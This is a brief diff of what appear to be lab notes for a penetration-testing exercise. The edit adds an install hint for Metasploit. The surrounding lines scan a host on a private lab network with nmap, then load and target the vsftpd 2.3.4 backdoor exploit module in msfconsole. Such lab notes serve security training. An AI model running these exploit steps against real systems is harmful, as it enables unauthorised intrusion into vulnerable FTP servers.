@@ -35,7 +35,7 @@ meta ifconfig (ip)
 kali
 
 nmap -sV 192.168.56.103
-msfconsole
+msfconsole (apt install metasploit-framework)
 search vsftpd
 use exploit/unix/ftp/vsftpd_234_backdoor
 set RHOSTS 192.168.56.103
